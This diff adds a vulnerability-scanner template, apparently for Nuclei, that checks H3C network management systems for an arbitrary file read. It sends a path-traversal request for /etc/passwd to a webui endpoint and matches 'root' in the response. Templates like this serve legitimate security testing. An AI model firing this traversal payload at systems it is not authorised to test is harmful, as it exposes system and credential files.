@@ -1,0 +1,36 @@
+id: h3c-nms-arbitrary-file-read
+
+info:
+  name: Arbitrary File Read in H3C Network Management System
+  author: onewin
+  severity: high
+  description: Checks for an arbitrary file read vulnerability in H3C Network Management Systems.
+
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Upgrade-Insecure-Requests: 1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "root"
+        part: body
+
+      - type: dsl
+        dsl:
+          - "contains(body, 'root')"
